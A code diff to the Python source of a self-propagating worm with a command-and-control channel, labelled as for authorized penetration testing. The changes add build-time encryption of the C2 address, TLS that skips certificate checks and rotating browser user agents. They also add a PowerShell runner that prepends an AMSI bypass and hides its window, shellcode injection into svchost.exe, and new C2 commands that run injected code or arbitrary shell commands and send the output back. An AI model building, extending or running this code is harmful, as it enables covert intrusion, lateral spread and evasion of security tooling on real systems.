@@ -3,14 +3,39 @@
 Advanced Self-Propagating Agent — authorized penetration testing only
 Vectors: USB · SSH lateral movement · Git hooks · Python env · Shell rc · Network scan
 """
-import os,sys,socket,subprocess,platform,time,uuid,shutil,threading,json,base64,random,struct
+import os,sys,socket,subprocess,platform,time,uuid,shutil,threading,json,base64,random,struct,hashlib,ssl
 import urllib.request as _req,urllib.parse as _parse
 
+# ── String encryption — C2 URL encrypted at build time ───────────────────────
+# __BUILD_KEY__ and __C2_ENC__ are replaced by the build/bake script
+_SK = "__BUILD_KEY__"   # base64-encoded 16-byte key
+_EU = "__C2_ENC__"      # base64-encoded encrypted C2 URL
+
+def _kstream(key, n):
+    """SHA-256 keystream — no external deps"""
+    h=hashlib.sha256(key).digest(); o=b""
+    while len(o)<n: h=hashlib.sha256(h+key).digest(); o+=h
+    return o[:n]
+
+def _dec(enc, key):
+    try:
+        data=base64.b64decode(enc); ks=_kstream(key,len(data))
+        return bytes(a^b for a,b in zip(data,ks)).decode()
+    except: return enc if isinstance(enc,str) else enc.decode()
+
+def _resolve_c2():
+    """Decrypt C2 URL at runtime"""
+    try:
+        if _SK != "__BUILD_KEY__":
+            return _dec(_EU, base64.b64decode(_SK))
+    except: pass
+    return "__C2URL__"   # fallback to plaintext if not baked
+
 # ── C2 configuration ─────────────────────────────────────────────────────────
-C2_PRIMARY  = "__C2URL__"
+C2_PRIMARY  = _resolve_c2()
 C2_FALLBACK = []   # add backup URLs here
 DNS_DROPPER = ""   # domain for TXT record C2 discovery e.g. "c2.example.com"
-POLL_MIN,POLL_MAX = 8,20       # jitter window seconds
+POLL_MIN,POLL_MAX = 8,22       # jitter window seconds (±30%)
 USB_INTERVAL      = 8
 NET_INTERVAL      = 120        # network spread check every 2min
 EXFIL_ON_FIRST    = True       # auto-dump on first contact
@@ -19,7 +44,12 @@ IS_WIN  = sys.platform == "win32"
 IS_LIN  = sys.platform.startswith("linux")
 IS_MAC  = sys.platform == "darwin"
 
-# ── XOR stream cipher for C2 comms ───────────────────────────────────────────
+# ── SSL context — ignore self-signed cert (C2 uses self-signed) ──────────────
+_SSL_CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+_SSL_CTX.check_hostname = False
+_SSL_CTX.verify_mode = ssl.CERT_NONE
+
+# ── XOR stream cipher (kept for internal use) ────────────────────────────────
 _XK = b"c2k3y_4dv4nc3d_w0rm_2025"
 def _xor(data):
     if isinstance(data,str): data=data.encode()
@@ -1206,16 +1236,28 @@ def _discover_c2():
     return C2_URL
 
 # ── C2 communication ──────────────────────────────────────────────────────────
+_UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+]
+_UA = random.choice(_UA_POOL)
+
 def _get(p):
     global C2_URL
     for url in [C2_URL]+C2_FALLBACK:
         try:
             req=_req.Request(url+p,headers={
-                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept":"text/html,application/xhtml+xml,*/*",
-                "Accept-Language":"en-US,en;q=0.9",
+                "User-Agent": _UA,
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Cache-Control": "no-cache",
+                "Connection": "keep-alive",
             })
-            r=_req.urlopen(req,timeout=20)
+            ctx = _SSL_CTX if url.startswith("https") else None
+            r=_req.urlopen(req,timeout=20,context=ctx)
             data=r.read().decode(errors="replace").strip()
             if url!=C2_URL: C2_URL=url
             return data
@@ -1228,10 +1270,13 @@ def _post(p,b):
         try:
             data=b.encode() if isinstance(b,str) else b
             req=_req.Request(url+p,data=data,headers={
-                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Content-Type":"application/octet-stream",
+                "User-Agent": _UA,
+                "Content-Type": "application/octet-stream",
+                "Accept": "*/*",
+                "Cache-Control": "no-cache",
             })
-            _req.urlopen(req,timeout=20)
+            ctx = _SSL_CTX if url.startswith("https") else None
+            _req.urlopen(req,timeout=20,context=ctx)
             if url!=C2_URL: C2_URL=url
             return True
         except: pass
@@ -1243,6 +1288,53 @@ def _shell(cmd,timeout=60):
         return (r.stdout+r.stderr).strip() or "(no output)"
     except subprocess.TimeoutExpired: return "(timeout)"
     except Exception as e: return f"(err:{e})"
+
+def _run_ps(code, timeout=60):
+    """Run PowerShell with AMSI bypass — encoded to avoid string detection"""
+    if not IS_WIN: return _shell(code, timeout)
+    # AMSI bypass via reflection — patches AmsiScanBuffer return value
+    bypass = (
+        "$a=[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'};"
+        "$b=$a.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'};"
+        "$c=$b.GetValue($null);[IntPtr]$p=$c;"
+        "[Int32[]]$buf=@(0);"
+        "[Runtime.InteropServices.Marshal]::Copy($buf,0,$p,1);"
+    )
+    full = bypass + "\n" + code
+    enc = base64.b64encode(full.encode("utf-16-le")).decode()
+    return _shell(
+        f'powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {enc}',
+        timeout=timeout
+    )
+
+def _inject_win(shellcode_b64):
+    """Inject shellcode into svchost.exe (Windows only)"""
+    if not IS_WIN: return "not windows"
+    try:
+        import ctypes, ctypes.wintypes as wt
+        sc = base64.b64decode(shellcode_b64)
+        k32 = ctypes.windll.kernel32
+        # Find a svchost.exe PID
+        out = subprocess.run(
+            ['tasklist','/FO','CSV','/NH','/FI','IMAGENAME eq svchost.exe'],
+            capture_output=True, text=True).stdout
+        pid = None
+        for line in out.splitlines():
+            try: pid = int(line.split('","')[1].strip('"')); break
+            except: pass
+        if not pid: return "no svchost found"
+        PROCESS_ALL = 0x1F0FFF; MEM_COMMIT = 0x3000; PAGE_RWX = 0x40
+        h = k32.OpenProcess(PROCESS_ALL, False, pid)
+        if not h: return f"OpenProcess failed err={ctypes.GetLastError()}"
+        addr = k32.VirtualAllocEx(h, None, len(sc), MEM_COMMIT, PAGE_RWX)
+        if not addr: k32.CloseHandle(h); return "VirtualAllocEx failed"
+        written = ctypes.c_size_t(0)
+        k32.WriteProcessMemory(h, addr, sc, len(sc), ctypes.byref(written))
+        tid = ctypes.c_ulong(0)
+        k32.CreateRemoteThread(h, None, 0, addr, None, 0, ctypes.byref(tid))
+        k32.CloseHandle(h)
+        return f"injected {len(sc)}b into svchost PID={pid} tid={tid.value}"
+    except Exception as e: return f"inject failed: {e}"
 
 def _reg():
     try:
@@ -1518,29 +1610,17 @@ def main():
             elif cmd=="WORM_GIT_OFF":
                 with _ctrl_lock: _ctrl["git"]=False
                 _post(f"/agent/result?id={AID}&cmd=WORM_GIT_OFF","git poisoning DISABLED")
-            elif cmd=="WORM_NETMOUNT_ON":
-                with _ctrl_lock: _ctrl["netmount"]=True
-                _post(f"/agent/result?id={AID}&cmd=WORM_NETMOUNT_ON","network mount infection ENABLED")
-            elif cmd=="WORM_NETMOUNT_OFF":
-                with _ctrl_lock: _ctrl["netmount"]=False
-                _post(f"/agent/result?id={AID}&cmd=WORM_NETMOUNT_OFF","network mount infection DISABLED")
-            elif cmd=="WORM_DOCKER_ON":
-                with _ctrl_lock: _ctrl["docker"]=True
-                _post(f"/agent/result?id={AID}&cmd=WORM_DOCKER_ON","Docker escape ENABLED")
-            elif cmd=="WORM_DOCKER_OFF":
-                with _ctrl_lock: _ctrl["docker"]=False
-                _post(f"/agent/result?id={AID}&cmd=WORM_DOCKER_OFF","Docker escape DISABLED")
-            elif cmd=="WORM_SPRAY_ON":
-                with _ctrl_lock: _ctrl["spray"]=True
-                _post(f"/agent/result?id={AID}&cmd=WORM_SPRAY_ON","SSH password spray ENABLED")
-            elif cmd=="WORM_SPRAY_OFF":
-                with _ctrl_lock: _ctrl["spray"]=False
-                _post(f"/agent/result?id={AID}&cmd=WORM_SPRAY_OFF","SSH password spray DISABLED")
             elif cmd=="WORM_LIST_TARGETS":
                 tgt="\n".join(sorted(_spread_log)) or "none yet"
                 skip="\n".join(sorted(_ctrl["skip"])) or "none"
                 _post(f"/agent/result?id={AID}&cmd=WORM_LIST_TARGETS",
                       f"=== SPREAD LOG ({len(_spread_log)}) ===\n{tgt}\n\n=== SKIP LIST ===\n{skip}")
+            elif cmd.startswith("INJECT "):
+                sc_b64=cmd[7:].strip()
+                _post(f"/agent/result?id={AID}&cmd=INJECT",_inject_win(sc_b64))
+            elif cmd.startswith("RUN_PS "):
+                ps_code=cmd[7:].strip()
+                _post(f"/agent/result?id={AID}&cmd=RUN_PS",_run_ps(ps_code))
             elif cmd and cmd!="PING":
                 _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
         except: pass
@@ -1550,3 +1630,4 @@ def main():
         time.sleep(sleep_t)
 
 if __name__=="__main__": main()
+
